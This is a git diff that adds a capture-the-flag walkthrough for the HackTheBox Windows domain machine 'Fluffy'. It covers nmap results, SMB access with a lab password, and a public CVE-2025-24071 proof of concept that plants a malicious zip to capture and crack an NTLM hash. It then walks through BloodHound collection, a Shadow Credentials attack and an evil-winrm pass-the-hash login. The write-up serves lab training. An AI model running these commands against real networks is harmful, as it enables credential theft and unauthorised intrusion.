@@ -1,11 +1,126 @@
 # HTB - Fluffy 🐇
 
-Welcome to my writeup for the HackTheBox machine **Fluffy**.  
+Welcome to my writeup for the HackTheBox machine Fluffy. Fluffy is a easy Windows Active Directory box that focuses on enumeration, SMB exploitation, Kerberos attacks, and privilege escalation. 
 This repository is for educational purposes only.
 
-## Sections
-- [Recon](recon.md)
-- [SMB Enumeration](smb.md)
-- [Exploitation](exploitation.md)
-- [BloodHound Analysis](bloodhound.md)
-- [Kerberos Attack Flow](kerberos.md)
+## Nmap Scan
+
+```
+Nmap scan report for 10.129.127.23
+Host is up (0.035s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-20 21:05:51Z)
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+
+### Key Findings
+- Exposed SMB shares
+- Kerberos & LDAP suggest Active Directory Domain Controller
+- WinRM service available
+
+
+```
+smbmap -H 10.129.186.239 -u j.fleischman -p J0elTHEM4n1990!
+
+smbclient //10.129.186.239/IT -U 'j.fleischman'
+
+mget *
+```
+
+On SMB, we see that we have write permission for the IT share, and we find a PDF with vulnerabilities.
+
+Now that we have the list of vulnerabilities, let's move on to exploits.
+
+
+To find a good example of how to run a exploit CVE- Title -github poc in google. 
+You should find https://github.com/LOOKY243/CVE-2025-24071-PoC
+
+
+### Steps
+1. Copy the exploit.py file to your machine 
+2. python3 ```exploit.py -i 10.10.16.40 -s shared -f evil```
+ 3. Start listener for hash capture:
+   ```sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support```
+   3. Upload payload to target IT share.
+      ``put evil.zip``
+
+4. You should se username + hash on listner.
+
+5. Crack the with rockyou.txt: 
+  ``` hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt``
+
+  ```
+    sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
+  --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP> ```
+
+
+Observations
+
+User has GenericWrite permissions over the Service Accounts group, which allows access to WINRM_SVC, an account with WinRM permissions. Given that the user we were provided and the one we discovered do not have permission to execute evil-winrm, this appears to be the logical path for obtaining the flag.
+
+In this scenario, `<USER>` is a member of the **Service Accounts** group and has `GenericWrite` permissions on the group. This opens the possibility for a **Shadow Credentials** attack.
+
+
+
+## Preparations
+
+- Install the following tools in a virtual environment:
+  - `pywhisker`
+  - `PKINITtools`
+  - `faketime`
+- Starting a virtual environment might also be useful 
+
+---
+
+## Add User to Service Accounts
+
+```bash
+net rpc group addmem "Service Accounts" "<USER>" \
+  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"
+
+
+Request Kerberos TGT for Service Account
+
+If your local time does not match the Domain Controller (DC), you may encounter errors. Synchronize time first:
+
+sudo rdate -n <TARGET_IP>
+
+
+Generate a TGT using faketime:
+
+faketime '<DATE_TIME>' python3 gettgtpkinit.py \
+  -cert-pem key_cert.pem \
+  -key-pem key_priv.pem \
+  fluffy.htb/<SERVICE_ACCOUNT> \
+  <SERVICE_ACCOUNT>.ccache
+
+
+Set the Kerberos ticket environment variable:
+
+export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache
+
+
+Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.
+
+Retrieve NT Hash
+faketime '<DATE_TIME>' python3 getnthash.py \
+  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>
+
+Access Service Account
+evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>
+
+
+
